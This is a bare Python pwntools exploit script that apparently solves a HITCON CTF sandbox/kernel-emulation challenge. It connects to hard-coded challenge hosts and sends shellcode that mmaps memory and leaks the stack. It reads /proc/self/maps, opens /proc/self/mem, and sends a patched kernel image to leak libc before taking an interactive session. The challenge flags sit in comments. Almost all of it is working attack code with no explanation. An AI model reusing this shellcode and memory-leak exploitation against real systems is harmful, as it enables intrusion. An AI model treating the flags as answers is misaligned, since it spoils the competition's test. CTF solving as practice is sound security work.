#!/usr/bin/env python
from pwn import *
import re

# hitcon{Go_ahead,_traveler,_and_get_ready_for_deeper_fear.}
# hitcon{take_out_all_memory,_take_away_your_soul}

context.arch = 'amd64'
host , port = '35.200.23.198' , 31733
#host , port = '60.251.236.18' , 3333
y = remote( host , port )

kernel = open( './kernel.bin' ).read()

s = '31a-\\a:2107732+a;,' + '\x90' * 70
s += asm(
    '''
    mov rdi, 0x217000
    mov rsi, 0xc00000
    mov rdx, 7
    mov r10, 16
    mov r8, -1
    mov r9, 0
    mov rax, 8
    inc rax
    syscall
    mov rbp, rax

    push rsp
    mov rdi, 1
    mov rsi, rsp
    mov rdx, 8
    mov rax, 1
    syscall

    mov rdi, 0
    mov rsi, rbp
    mov rdx, 0xc00000
    mov rax, 0
    syscall
    ''' +
    shellcraft.pushstr( '/proc/self/maps\x00' ) + 
    shellcraft.open( 'rsp' , 0 , 0 ) +
    shellcraft.read( 'rax' , 'rsp' , 0x300 ) +
    shellcraft.write( 1 , 'rsp' , 0x300 ) +
    '''
    mov rdi, 0
    mov rsi, rbp
    mov rdx, 0xc00000
    mov rax, 0
    syscall
    ''' +
    shellcraft.pushstr( '/proc/self/mem\x00' ) + 
    shellcraft.open( 'rsp' , 0 , 0 ) +
    '''
    push rax
    '''+
    shellcraft.write( 1 , 'rsp' , 8 ) +
    '''
    mov rbx, rax

    
    mov rax, 0
    syscall
    y:
    jmp y
    '''
)

y.sendlineafter( 'down.' , s )
y.recvline()
user_stack = u64( y.recv(8) )
success( 'User stack -> %s' % hex( user_stack ) )

k_mod   = kernel[:0x14d] + p64( 0x8002000000 ) + p64( user_stack + 0x100 ) + kernel[0x15d:0x9a4] + '\x90' * 0x75
k_mod += kernel[ len( k_mod ) : 0xdf7 ]

sleep(1)
y.send( k_mod + asm( 'mov edi, 0x8001' )  )
y.recvuntil( 'rw-s' )
o = y.recvuntil( 'r-xp' )
libc = int( re.findall( '(............)-' , o )[0] , 16 )
success( 'libc -> %s' % hex( libc ) )

sleep(1.6)
y.send( k_mod + asm( 'mov edi, 0x8008' )  )



y.interactive()


